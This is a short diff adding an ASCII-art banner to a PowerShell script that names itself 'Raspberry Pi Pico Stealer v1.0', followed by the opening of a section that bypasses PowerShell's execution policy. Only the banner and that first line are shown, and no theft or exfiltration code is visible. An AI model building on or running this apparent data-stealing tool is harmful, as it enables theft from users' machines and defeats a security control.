@@ -1,3 +1,11 @@
+Clear
+Write-Host " ,d88b.d88b,                                   " -ForegroundColor Magenta
+Write-Host " 88888888888    Raspberry Pi Pico Stealer v1.0 " -ForegroundColor Magenta
+Write-Host " 'Y8888888Y'    By @kryyaasoft                 " -ForegroundColor Magenta
+Write-Host "   'Y888Y'                                     " -ForegroundColor Magenta
+Write-Host "     'Y'                                       " -ForegroundColor Magenta
+Write-Host " "
+
 # Bypass Execution Policy
 try {
     Write-Host "Bypassing Execution Policy..."
